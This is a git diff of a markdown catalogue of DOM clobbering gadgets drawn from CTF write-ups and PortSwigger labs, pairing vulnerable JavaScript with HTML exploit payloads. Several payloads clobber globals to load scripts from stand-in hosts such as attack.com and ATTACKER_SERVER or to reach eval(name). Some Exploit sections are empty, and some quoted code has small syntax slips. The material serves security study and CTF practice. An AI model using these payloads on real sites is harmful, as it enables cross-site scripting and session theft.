@@ -1,39 +1,55 @@
 ## Existing DOM Clobbering Gadgets
 
+### AMP4Email
 
-### Github
+#### Reference
++ https://research.securitum.com/xss-in-amp4email-dom-clobbering/
++ https://blog.huli.tw/2021/01/23/en/dom-clobbering/
 
-
-### Blogs from Google
-
-https://research.securitum.com/xss-in-amp4email-dom-clobbering/
-https://blog.huli.tw/2021/01/23/en/dom-clobbering/
+#### Vulnerable Code
 ```
-var script = window.document.createElement("script");
-script.async = false;
+<script>
+  var script = window.document.createElement("script");
+  script.async = false;
 
-var loc;
-if (AMP_MODE.test && window.testLocation) {
-    loc = window.testLocation
-} else {
-    loc = window.location;
-}
+  var loc;
+  if (AMP_MODE.test && window.testLocation) {
+      loc = window.testLocation
+  } else {
+      loc = window.location;
+  }
 
-if (AMP_MODE.localDev) {
-    loc = loc.protocol + "//" + loc.host + "/dist"
-} else {
-    loc = "https://cdn.ampproject.org";
-}
+  if (AMP_MODE.localDev) {
+      loc = loc.protocol + "//" + loc.host + "/dist"
+  } else {
+      loc = "https://cdn.ampproject.org";
+  }
 
-var singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + "/" : "";
-b.src = loc + "/rtv/" + AMP_MODE.rtvVersion; + "/" + singlePass + "v0/" + pluginName + ".js";
+  var singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + "/" : "";
+  b.src = loc + "/rtv/" + AMP_MODE.rtvVersion; + "/" + singlePass + "v0/" + pluginName + ".js";
 
-document.head.appendChild(b);
+  document.head.appendChild(b);
+</script>
 ```
 
+#### Exploit
+```
+<a id="AMP_MODE" name="localDev"></a>
+<a id="AMP_MODE" name="test"></a>
+
+<a id="testLocation"></a>
+<a id="testLocation" name="protocol" href="https://attack.com"></a>
+```
+
+### Fword CTF - Shisui Web
+
+#### Reference
 + https://lebr0nli.github.io/blog/security/fwordCTF2021/#shisui-web
 + https://web.archive.org/web/20220524204523/https://blog.bi0s.in/2021/08/30/Web/Fword-CTF-2021-Shisui-Write-up/
+
+#### Vulnerable Code
 ```
+<script>
 window.SETTINGS = window.SETTINGS || [{
   dataset:{
     "timezone":"",
@@ -59,80 +75,74 @@ function addInfos(){
 	}
 }
 addInfos()
+</script>
 ```
+
+#### Exploit
 ```
 <a id=SETTINGS data-timezone=aaa data-location=eval(name)></a>
 <a id=SETTINGS name=check></a>
 <a id=showInfos></a>
 ```
 
+
+### AmateursCTF 2023 Sanity
+
+#### Reference
 + https://ctftime.org/writeup/37463
+
+#### Vulnerable Code
 ```
-async function loadBody() {
-    let extension = null;
-    if (window.debug?.extension) {
-        let res = await fetch(window.debug?.extension.toString());
-        extension = await res.json();
-    }
+<script>
+  function loadBody() {
+      let extension = null;
+      if (window.debug?.extension) {
+          let res = await fetch(window.debug?.extension.toString());
+          extension = await res.json();
+      }
+  }
+  loadBody();
+</script>
 ```
+
+#### Exploit
 ```
 <a id="debug"></a><a id="debug" name="extension" href="//ATTACKER_SERVER"></a>
 ```
 
+### Wizer CTF #14
 
+
+#### Reference:
 + https://wizer-ctf.com/writeups/ctf14.html
-```
-export default function Home() {
-  const router = useRouter();
-  const { yourName, yourAvatar, transferTo, pointsToTransfer } = router.query;
-  const isNameProvided = typeof yourName === 'string' && yourName.length > 0;
-  React.useEffect(() => {
-    if (router.isReady && isNameProvided) {
-      // Sanitize your name and avatar image
-      const name = DOMPurify.sanitize(yourName);
-      const avatar = yourAvatar ? DOMPurify.sanitize(String(yourAvatar)) : '<img src="/favicon.png" width="20px">';
-      document.getElementById('name').innerText = name;
-      document.getElementById('avatar').innerHTML = avatar;
-      if(window.transferBalance && transferTo && pointsToTransfer) {
-        var formData = JSON.stringify(router.query.serializeArray());
-        const response = $.ajax({type: "POST", url: '../api/transferPoints', async: false,
-          data: formData, success: function(){}, dataType: 'json',
-          contentType : 'application/json'})
-        if(response.status === 200) { alert(`${name}, you’ve successfully transfered ${pointsToTransfer} + 
-        points to account ID ${transferTo}`); }
-        else { $("#error").text(decodeURIComponent(response.responseText)); }
-      }
-    }
-  }, [router.isReady, isNameProvided]);
 
-  return (
-    <main className="text-center mt-5">
-      <h6>
-        <span id="avatar"></span>&nbsp;
-        <span>Hello <span id="name"></span> what would you want to do next?</span>
-      </h6>
-      <h3 className="h3 mb-3 fw-normal">Points management</h3>
-      <h5 className="h5 mb-2 fw-normal" style={{cursor: 'pointer'}}
-        onClick={() => { router.push('/transfer')}}>Transfer Points</h5>
-      <h5 className="h5 mb-2 fw-normal" style={{cursor: 'pointer'}}
-        onClick={() => { router.push('/buy')}}>Buy points</h5>
-      <h5 className="h5 mb-2 fw-normal" style={{cursor: 'pointer'}}
-        onClick={() => { router.push('/trends')}}>Points spending trends</h5>
-      <div className={styles.footer}>
-        Powered by <Image src="/wizer.svg"
-          alt="Wizer"
-          width={200}
-          height={100}
-          className={styles.logo} />
-      </div>
-    </main>
-  )
+#### Vulnerable Code
+```
+<script>
+if(window.transferBalance && transferTo && pointsToTransfer) {
+  var formData = JSON.stringify({"a": transferTo, "b": pointsToTransfer});
+  const response = $.ajax({type: "POST", url: '../api/transferPoints', async: false,
+    data: formData, success: function(){}, dataType: 'json',
+    contentType : 'application/json'})
 }
+</script>
 ```
 
+#### Exploit
+```
+<a id=transferBalance></a>
+<a id=transferTo></a>
+<a id=pointsToTransfer href="https://attack.com"></a>
+```
 
+### Notes CTF Challenge
+
+#### Reference
 + https://github.com/aszx87410/ctf-writeups/issues/55
+
+#### Vulnerable Code
 ```
+<script>
 function reloadRecaptchaScript(index) {
   // delay for a bit to not block main thread
   setTimeout(() => {
@@ -146,11 +156,25 @@ function reloadRecaptchaScript(index) {
     loadScript(src)
   }, 1000)
 }
+reloadRecaptchaScript();
+</script>
 ```
 
+#### Exploit
+```
+```
+
+
+### ReCAPTCHA for the rescue
+
+#### Reference
 + https://gist.github.com/terjanq/e2198440c4fdfbdec43e921b600d4a1d#recaptcha-for-the-rescue
 + https://ctftime.org/writeup/23580
+
+
+#### Vulnerable Code
 ```
+<script>
 function writeOutput() {
   if (statusCode !== 3) {
     if (CONFIG.unsafeRender) {
@@ -160,10 +184,25 @@ function writeOutput() {
     }
   }
 }
+writeOutput();
+</script>
 ```
 
-+ https://ctftime.org/writeup/32719
+#### Exploit
 ```
+```
+
+
+
+### Tamil CTF: Don't Only Mash... Clobber!
+
+#### Reference
++ https://ctftime.org/writeup/32719
+
+#### Vulnerable Code
+```
+<img id="user-image" src="https://devloper.com">
+<script>
 window.onload = () => {
     const imgSrc = document.getElementById('user-image').src
     document.getElementById('user-image-info').innerText = imgSrc
@@ -174,9 +213,18 @@ window.onload = () => {
         document.getElementById('body').insertAdjacentHTML('beforeend', `<img src="${DEBUG_LOGGING_URL}?auth=${btoa(document.cookie)}&image=${btoa(imgSrc)}">`)
     }
 }
+</script>
 ```
+#### Exploit
 
+
+
+### zer0pts CTF 2021: Simple Blog
+
+#### Reference
 + https://ctftime.org/writeup/26317
+
+#### Vulnerable Code
 ```
 <!doctype html>
 <html lang="en">
@@ -275,7 +323,17 @@ window.onload = () => {
 </html>
 ```
 
+#### Exploit
+```
+```
+
+
+### PortSwigger DOM Clobbering Lab
+
+#### Reference
 + https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering
+
+#### Vulnerable Code
 ```
 <div id="user-comments"></div>
 
@@ -357,8 +415,18 @@ comments = [
 displayComments(comments)
 </script>
 ```
+#### Exploit
+```
+```
 
+
+
+### PortSwigger DOM Clobbering Lab2
+
+#### Reference
 + https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters
+
+#### Vulnerable Code
 ```
 <body></body>
 
@@ -548,7 +616,17 @@ document.body.innerHTML = janitor.clean(INPUT);
 </script>
 ```
 
+#### Exploit
+```
+```
+
+
+### Intigriti-2024-memo
+
+#### Reference:
 + https://sec.stealthcopter.com/intigriti-july-2024-ctf-challenge-memo/
+
+#### Vulnerable Code:
 ```
 <!DOCTYPE html>
 <html lang="en">
